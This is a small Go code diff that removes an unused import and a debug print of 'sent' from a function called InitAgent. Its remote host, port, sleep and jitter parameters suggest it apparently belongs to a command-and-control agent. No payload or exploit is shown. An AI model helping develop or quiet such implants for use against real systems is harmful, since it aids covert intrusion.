@@ -7,7 +7,6 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/json"
-	"fmt"
 	"io"
 	"net/http"
 
@@ -94,8 +93,6 @@ func InitAgent(rhost string, rport string, uri string, sleep int, jitter int, li
 	if err != nil {
 		return err
 	}
-
-	fmt.Println("sent")
 
 	return nil
 }
